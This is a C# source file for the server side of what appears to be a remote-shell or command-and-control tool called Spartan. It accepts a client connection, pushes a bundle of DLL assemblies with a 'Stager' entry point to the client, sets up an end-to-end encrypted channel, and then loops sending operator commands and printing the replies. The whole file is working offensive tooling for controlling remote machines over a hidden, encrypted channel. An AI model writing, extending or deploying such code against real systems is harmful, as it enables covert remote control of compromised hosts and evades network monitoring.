using System.Net;
using Spartan.Models.Payload;
using Spartan.Models.ResponseModels;

namespace Spartan.Server;

public class Shell
{
    private readonly RequestParser _requestParser = new();
    private readonly ResponseFormatter _responseFormatter = new();

    public void ExecuteShell(IPAddress serverIpAddress, int serverPort, string payloadDirectory)
    {
        var socketServer = new SocketServer(serverIpAddress, serverPort);

        Console.WriteLine($"Received connection from {socketServer.ClientIpAddress}:{socketServer.ClientPort}!");
        Console.WriteLine($"Sending payload to {socketServer.ClientIpAddress}:{socketServer.ClientPort} ...");

        var payload = GeneratePayload(payloadDirectory);
        socketServer.SendData(payload, false);

        socketServer.PerformX3dhHandshake();
        socketServer.InitializeRatchet();

        Console.WriteLine(
            "Client successfully initialized, and the connection is now end to end encrypted! You can now start sending commands.");

        while (true)
        {
            // TODO: Create exit command
            Console.Write("> ");
            var input = Console.ReadLine();
            var parsedInput = _requestParser.Parse(input!);
            socketServer.SendData(parsedInput);

            ICommandResponseModel response = socketServer.ReceiveData();
            var formattedResponse = _responseFormatter.Format(response);
            Console.WriteLine(formattedResponse);
        }
    }

    private static PayloadModel GeneratePayload(string payloadDirectory)
    {
        var files = Directory.GetFiles(payloadDirectory, "*.dll");

        Dictionary<string, byte[]> assemblyBinaries = new();

        // Write each file as a name-content pair
        foreach (var filePath in files)
            assemblyBinaries[Path.GetFileNameWithoutExtension(filePath)] = File.ReadAllBytes(filePath);

        var payload = new PayloadModel
        {
            PayloadName = "Spartan.Payload",
            PayloadEntryPoint = "Spartan.Payload.Stager",
            AssemblyBinaries = assemblyBinaries
        };

        return payload;
    }
}